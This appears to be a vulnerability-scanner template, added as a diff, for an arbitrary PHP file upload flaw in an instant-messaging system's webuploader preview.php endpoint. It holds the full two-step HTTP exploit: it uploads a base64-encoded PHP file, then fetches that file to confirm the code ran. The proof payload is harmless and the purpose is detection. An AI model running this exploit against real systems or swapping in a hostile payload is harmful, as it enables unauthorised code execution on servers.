@@ -1,0 +1,52 @@
+id: poc-yaml-ims-preview-php-anyfile-upload
+info:
+  name: IM即时通讯系统 preview.php 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+  t3: "{{base64(concat('<?php echo md5(', t1, ');unlink(__FILE__);'))}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /static/lib/webuploader/0.1.5/server/preview.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        data:image/php;base64,{{t3}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ".php"
+          - "id"
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        regex:
+          - "(?i)([a-z0-9]{32}).php"
+  - raw:
+      - |
+        GET /static/lib/webuploader/0.1.5/server/preview/{{file}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
